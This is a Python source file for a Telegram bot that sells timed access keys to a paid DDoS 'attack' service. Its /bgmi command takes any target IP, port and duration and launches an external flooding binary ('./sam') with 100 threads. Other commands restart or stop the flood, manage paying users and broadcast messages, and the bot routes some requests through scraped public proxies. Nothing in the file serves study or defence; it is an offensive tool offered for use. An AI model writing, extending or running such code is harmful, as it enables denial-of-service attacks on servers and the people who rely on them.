from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import json
import os
import random
import string
import datetime
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 100
users = {}
keys = {}
user_processes = {}

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "𝑶𝑵𝑳𝒀 𝒀𝑶𝑼𝑹 𝑫𝑨𝑫 𝑪𝑨𝑵 𝑼𝑺𝑬 🗿 @DiscoRoot"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅𝙆𝙚𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮! 𝘼𝙘𝙘𝙚𝙨𝙨 𝙜𝙧𝙖𝙣𝙩𝙚𝙙 𝙪𝙣𝙩𝙞𝙡: {users[user_id]} OWNER- @DiscoRoot..."
        else:
            response = "𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙤𝙧 𝙚𝙭𝙥𝙞𝙧𝙚𝙙 𝙠𝙚𝙮 𝙗𝙪𝙮 𝙛𝙧𝙤𝙢👉 @DiscoRoot."
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "𝑶𝑵𝑳𝒀 𝒀𝑶𝑼𝑹 𝑫𝑨𝑫 𝑼𝑺𝑬."
    await update.message.reply_text(response)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝘼𝙘𝙘𝙚𝙨𝙨 𝙚𝙭𝙥𝙞𝙧𝙚𝙙 𝙤𝙧 𝙪𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙙𝙚𝙚𝙢 𝙖 𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮. 𝘽𝙪𝙮 𝙠𝙚𝙮 𝙛𝙧𝙤𝙢👉 @DiscoRoot")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    command = ['./sam', target_ip, port, duration, str(DEFAULT_THREADS)]

    process = subprocess.Popen(command)
    
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}
    
    await update.message.reply_text(f'𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫☠️🚀: {target_ip}:{port} for {duration} 𝑺𝑬𝑪𝑶𝑵𝑫𝑺 𝑾𝑰𝑻𝑯 {DEFAULT_THREADS} 𝑻𝑯𝑹𝑬𝑨𝑫𝑺.𝑶𝑾𝑵𝑬𝑹- @DiscoRoot')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝘼𝙘𝙘𝙚𝙨𝙨 𝙚𝙭𝙥𝙞𝙧𝙚𝙙 𝙤𝙧 𝙪𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙙𝙚𝙚𝙢 𝙖 𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮 𝙗𝙪𝙮 𝙠𝙚𝙮 𝙛𝙧𝙤𝙢- @DiscoRoot")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('𝑵𝑶 𝑨𝑵𝒀 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑶𝑹𝑴𝑨𝑻𝑺 𝑺𝑬𝑻. 𝑼𝑺𝑬 /𝒃𝒈𝒎𝒊 𝑻𝑶 𝑺𝑬𝑻 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑶𝑹𝑴𝑨𝑻𝑺.')
        return

    if user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text('Flooding is already running.')
        return

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text('🚀𝗦𝗧𝗔𝗥𝗧 𝗔𝗧𝗧𝗔𝗖𝗞🚀.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝘼𝙘𝙘𝙚𝙨𝙨 𝙚𝙭𝙥𝙞𝙧𝙚𝙙 𝙤𝙧 𝙪𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙙𝙚𝙚𝙢 𝙖 𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮 𝙗𝙪𝙮 𝙠𝙚𝙮 𝙛𝙧𝙤𝙢- @DiscoRoot")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('𝑵𝑶 𝑨𝑵𝒀 𝑨𝑻𝑻𝑨𝑪𝑲 𝑹𝑼𝑵𝑵𝑰𝑵𝑮 𝑷𝑹𝑶𝑪𝑪𝑬𝑺.𝑶𝑾𝑵𝑬𝑹👉 @DiscoRoot')
        return

    user_processes[user_id]["process"].terminate()
    del user_processes[user_id]  # Clear the stored parameters
    
    await update.message.reply_text('𝗦𝗧𝗢𝗣 𝗔𝗧𝗧𝗔𝗖𝗞 ☠️🗿.')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message, request_kwargs={'proxies': get_proxy_dict()})
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "𝑶𝑵𝑳𝒀 𝒀𝑶𝑼𝑹 𝑫𝑨𝑫 𝑼𝑺𝑬."
    
    await update.message.reply_text(response)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🔑𝑻𝑯𝑰𝑺 𝑩𝑶𝑻 𝑶𝑾𝑵𝑬𝑹 DISCO.\nCommands:\n/redeem <key>\n/stop\n/start\n/genkey <hours/days> \nOWNER- @DiscoRoot")

if __name__ == '__main__':
    load_data()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("help", help_command))

    app.run_polling()
